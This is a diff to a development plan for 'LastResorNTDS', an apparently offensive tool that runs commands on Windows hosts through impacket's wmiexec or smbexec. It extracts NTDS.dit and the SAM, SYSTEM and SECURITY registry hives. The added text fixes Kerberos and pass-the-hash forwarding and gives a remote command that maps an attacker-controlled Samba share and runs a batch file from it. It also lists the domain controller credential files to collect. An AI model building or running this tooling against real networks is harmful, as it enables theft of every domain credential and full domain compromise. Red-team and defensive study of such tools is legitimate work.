@@ -1,6 +1,7 @@
 # LastResorNTDS rewrite: implementation plan
 
 **Date:** 2026-10-29
+**Updated:** 2026-10-29 (second pass — verified against source)
 **Status:** Approved, not started
 **Branch:** TBD (create before work begins)
 
@@ -788,6 +789,351 @@ with a warning if absent.
 
 ---
 
+## Bugs found during plan review (second pass)
+
+These are bugs in the **current** code that the rewrite must fix. They are
+not new issues introduced by the plan.
+
+### Bug 1: Kerberos auth flags not forwarded to wmiexec
+
+The current code calls wmiexec like this:
+
+```python
+os.system(f'python wmiexec.py {domain}/{username}:{password}@{remoteName}  \'{command}\'')
+```
+
+It does **not** pass `-k`, `-aesKey`, `-dc-ip`, `-target-ip`, `-port`, or
+`-keytab` to wmiexec. If the user runs LastResorNTDS with `-k -no-pass`,
+the main script accepts the args and loads the keytab, but wmiexec never
+receives them. Kerberos authentication is broken.
+
+**Fix in Phase 4:** the `execute_remote()` function must forward all auth
+and connection flags to whichever exec tool is selected. The full list:
+
+- `-hashes` (already forwarded, but with broken quoting)
+- `-k` (not forwarded)
+- `-aesKey` (not forwarded)
+- `-dc-ip` (not forwarded)
+- `-target-ip` (not forwarded)
+- `-port` (not forwarded)
+- `-keytab` (not forwarded — note: keytab content is loaded locally by
+  LastResorNTDS, but `-k` still needs to reach the exec tool)
+
+### Bug 2: Password validation blocks Kerberos-only auth
+
+```python
+if not password and not hashes:
+    parser.error('You must provide either a password or NTLM hashes.')
+```
+
+This rejects `-k -no-pass`, which is the standard Kerberos ccache flow.
+
+**Fix in Phase 2:** change the validation to also allow `-k` or `-aesKey`:
+
+```python
+if not password and not hashes and not args.k and not args.aesKey:
+    parser.error('You must provide a password, NTLM hashes, or Kerberos auth (-k or -aesKey).')
+```
+
+### Bug 3: `-share` flag is dead code
+
+```python
+parser.add_argument('-share', action='store', default='C$', ...)
+```
+
+`args.share` is never referenced in `main()`. It is never passed to
+wmiexec. wmiexec defaults to `ADMIN$` for its output share. The user's
+`-share` flag has no effect.
+
+**Fix in Phase 4:** pass `-share` through to the exec tool. Note the
+default difference:
+
+- `wmiexec.py` defaults to `ADMIN$`
+- `smbexec-shellless.py` defaults to `C$`
+
+The main script defaults to `C$`. Forward it explicitly so both tools
+use the same share.
+
+### Bug 4: Unused imports
+
+These imports in `LastResorNTDS.py` are never used:
+
+- `time` (line 2)
+- `re` (line 4)
+- `logging` (line 10) — `logging.basicConfig` is called but no logger
+  is used in the script's own functions
+- `smbserver` from impacket (line 17)
+- `transport` from impacket (line 18)
+- `scmr` from impacket (line 18)
+- `version` from impacket (line 17)
+- `logger` from impacket (line 15)
+
+**Fix in Phase 8:** remove unused imports. Keep `logging` only if we add
+proper logging.
+
+---
+
+## smbexec-shellless.py: argument format analysis
+
+The plan originally said "it likely follows the same impacket convention."
+After reading the source, here are the exact differences from wmiexec.py.
+Phase 4 must account for all of them.
+
+### Command argument
+
+- `wmiexec.py`: `command` uses `nargs='*'`, collects multiple positional
+  args, joins them with a space. Can run interactively if no command given.
+- `smbexec-shellless.py`: `command` uses `action='store'`, takes a single
+  positional string. Must be quoted on the command line.
+
+Both accept the command as the second positional argument after `target`.
+Both work when the command is passed as a single quoted string, which is
+how the current code calls wmiexec. No change needed for command passing.
+
+### Default output share
+
+- `wmiexec.py`: `-share` defaults to `ADMIN$`
+- `smbexec-shellless.py`: `-share` defaults to `C$`
+
+Both use this share to write and read a temporary output file. This is
+**not** the attacker's Samba share. The attacker share is mounted via
+`net use` in the remote command.
+
+### Extra flags on smbexec-shellless.py
+
+- `-service-name`: custom service name for the SCM-based execution.
+  Default is random. Do not forward from the main script. Let smbexec
+  generate its own.
+- `-unsafe-exec`: same flag exists on the main script. Forward it.
+- `-codec`: character encoding for output. Forward if present.
+
+### Extra flags on wmiexec.py
+
+- `-nooutput`: do not read output. Not needed.
+- `-silentcommand`: run without cmd.exe wrapper. Not needed.
+- `-com-version`: DCOM version. Not needed.
+- `-A`: auth file. Not needed.
+
+### Global variable usage in smbexec-shellless.py
+
+`smbexec-shellless.py` reads `command` and `options` as module-level
+globals inside `RemoteShell.__init__()`. This means it must be called as
+a script (via subprocess), not imported. The plan already calls it via
+subprocess, so this is not a problem.
+
+### How smbexec handles `&&` in commands
+
+`smbexec-shellless.py` splits the command on `&&` and `&` (lines 145-157)
+and executes each part as a separate Windows service. The current remote
+command is:
+
+```
+net use Q: \\{ip}\{share} /user:{user} {pass} && Q:\tempbat.bat
+```
+
+smbexec splits this into two separate service executions:
+1. `net use Q: \\{ip}\{share} /user:{user} {pass}`
+2. `Q:\tempbat.bat`
+
+This works because `net use` creates a system-wide drive mapping that
+persists across service executions. If the first command fails and
+`-unsafe-exec` is not set, smbexec skips the second command (line 161).
+This is the correct behavior.
+
+**Important:** the `-unsafe-exec` flag on the main script must be
+forwarded to smbexec-shellless.py so this safety check works. wmiexec
+does not have this flag and does not need it (it runs the entire command
+as one process via WMI).
+
+---
+
+## Corrections to the original plan
+
+### Phase 2 correction: password validation
+
+Add the Kerberos auth fix (Bug 2 above) to Phase 2. Change the validation
+to accept `-k` or `-aesKey` as alternatives to password and hashes.
+
+### Phase 4 correction: full auth forwarding
+
+The `execute_remote()` function must accept and forward all auth flags,
+not just hashes and password. Updated signature:
+
+```python
+def execute_remote(exec_method, domain, username, password, remote_name,
+                   hashes, command, kerberos=False, aes_key=None,
+                   dc_ip=None, target_ip=None, port='445', share='C$',
+                   unsafe_exec=False):
+```
+
+**For wmiexec, build this command:**
+
+```python
+cmd = [sys.executable, os.path.join(cwd, 'wmiexec.py')]
+if hashes:
+    cmd.extend(['-hashes', hashes])
+if kerberos:
+    cmd.append('-k')
+if aes_key:
+    cmd.extend(['-aesKey', aes_key])
+if dc_ip:
+    cmd.extend(['-dc-ip', dc_ip])
+if target_ip:
+    cmd.extend(['-target-ip', target_ip])
+cmd.extend(['-share', share])
+
+# Build target string
+if hashes or kerberos:
+    target_str = f'{domain}/{username}@{remote_name}'
+else:
+    target_str = f'{domain}/{username}:{password}@{remote_name}'
+
+cmd.append(target_str)
+cmd.append(command)
+```
+
+**For smbexec, build this command:**
+
+```python
+cmd = [sys.executable, os.path.join(cwd, 'smbexec-shellless.py')]
+if hashes:
+    cmd.extend(['-hashes', hashes])
+if kerberos:
+    cmd.append('-k')
+if aes_key:
+    cmd.extend(['-aesKey', aes_key])
+if dc_ip:
+    cmd.extend(['-dc-ip', dc_ip])
+if target_ip:
+    cmd.extend(['-target-ip', target_ip])
+if port:
+    cmd.extend(['-port', port])
+cmd.extend(['-share', share])
+if unsafe_exec:
+    cmd.append('-unsafe-exec')
+
+# Build target string (same as wmiexec)
+if hashes or kerberos:
+    target_str = f'{domain}/{username}@{remote_name}'
+else:
+    target_str = f'{domain}/{username}:{password}@{remote_name}'
+
+cmd.append(target_str)
+cmd.append(command)
+```
+
+### Phase 7 correction: cleanup with `-no-cleanup-image`
+
+The original cleanup code has a logic error. Step 7 deletes the share
+folder unconditionally, but the plan text says the image should be
+preserved when `-no-cleanup-image` is set. Fix:
+
+When `-no-cleanup-image` is set:
+1. Move the image from the share folder to the loot directory.
+2. Then delete the share folder.
+3. Print the image location so the user knows where to find it.
+
+```python
+if args.no_cleanup_image:
+    image_src = f'/var/tmp/{share_name}/image.img'
+    image_dest = os.path.join(loot_dir, 'image.img')
+    if os.path.exists(image_src):
+        shutil.move(image_src, image_dest)
+        print(f'{green_plus} Moved volume image to: {image_dest}')
+else:
+    image_path = f'/var/tmp/{share_name}/image.img'
+    if os.path.exists(image_path):
+        os.remove(image_path)
+        print(f'{green_plus} Deleted volume image: {image_path}')
+
+# Now safe to delete the share folder in both cases
+share_path = f'/var/tmp/{share_name}'
+if os.path.exists(share_path):
+    shutil.rmtree(share_path)
+    print(f'{green_plus} Deleted share folder: {share_path}')
+```
+
+### Phase 8 addition: remove unused imports
+
+Add this step to Phase 8. Remove these unused imports:
+
+```python
+# DELETE these lines:
+import time
+import re
+from impacket.examples import logger
+from impacket import version, smbserver
+from impacket.dcerpc.v5 import transport, scmr
+```
+
+Keep these (still used):
+
+```python
+import subprocess
+import os
+import shutil
+import argparse
+from datetime import datetime
+import random
+import string
+import logging          # keep if we add proper logging
+import sys
+import socket
+import errno
+import netifaces as ni
+from impacket.examples.utils import parse_target
+from impacket.krb5.keytab import Keytab
+```
+
+### Phase 5 addition: ntfs-3g dependency
+
+Mounting an NTFS image on Linux requires the `ntfs-3g` package (or the
+kernel `ntfs3` module on Linux 5.15+). The `mount` command auto-detects
+NTFS and calls the correct driver, but the driver must be installed.
+
+Add `ntfs-3g` to the requirements in the README (Phase 9). Add a check
+in `mount_image()` that prints a clear error if the mount fails with
+"unknown filesystem type 'ntfs'".
+
+### Phase 6 addition: DC mode should also include .LOG files
+
+The DC file list should also include the registry hive .LOG files. The
+hives are locked on a DC the same way they are on a workstation. A
+crash-consistent copy benefits from the same transaction logs.
+
+Updated file lists:
+
+**DC mode:**
+```python
+DC_FILES = [
+    'Windows/NTDS/ntds.dit',
+    'Windows/System32/config/SYSTEM',
+    'Windows/System32/config/SYSTEM.LOG1',
+    'Windows/System32/config/SYSTEM.LOG2',
+    'Windows/System32/config/SAM',
+    'Windows/System32/config/SAM.LOG1',
+    'Windows/System32/config/SAM.LOG2',
+    'Windows/System32/config/SECURITY',
+    'Windows/System32/config/SECURITY.LOG1',
+    'Windows/System32/config/SECURITY.LOG2',
+]
+```
+
+**Workstation mode:** unchanged (same list minus `ntds.dit`).
+
+---
+
+## Updated requirements list (for README)
+
+- Python 3.6+
+- impacket (for `parse_target` and `Keytab`)
+- netifaces
+- Samba (`smbd`) installed on the attacker box
+- ntfs-3g (or Linux 5.15+ with the `ntfs3` kernel module)
+- sudo access on the attacker box
+
+---
+
 ## Testing checklist
 
 Before merging the rewrite, test each case:
@@ -796,15 +1142,22 @@ Before merging the rewrite, test each case:
 - [ ] DC mode with password auth against Server 2022
 - [ ] DC mode with password auth against Server 2025
 - [ ] DC mode with NTLM hash auth
-- [ ] DC mode with Kerberos auth
+- [ ] DC mode with Kerberos auth (`-k -no-pass`)
+- [ ] DC mode with AES key auth (`-aesKey`)
 - [ ] Workstation mode against Windows 10
 - [ ] Workstation mode against Windows 11
+- [ ] `-exec-method wmiexec` (default) against any target
 - [ ] `-exec-method smbexec` against any target
+- [ ] `-exec-method smbexec -unsafe-exec` verifies flag forwarding
 - [ ] `-volume D:` against a DC with NTDS on D:
 - [ ] `-loot-output /mnt/remote` with a mounted NFS or CIFS share
-- [ ] `-no-cleanup-image` keeps the image after extraction
+- [ ] `-no-cleanup-image` keeps the image in the loot directory
+- [ ] `-share` is forwarded to the exec tool
 - [ ] Cleanup removes user, group, share, and smb.conf backup
 - [ ] Cleanup detaches loop devices
+- [ ] Mount failure (missing ntfs-3g) prints a clear error
 - [ ] Mount failure prints an error and exits
 - [ ] Missing required file prints an error but continues
 - [ ] Missing optional .LOG file prints a warning and continues
+- [ ] `.LOG1` and `.LOG2` files are collected in DC mode
+- [ ] `.LOG1` and `.LOG2` files are collected in workstation mode
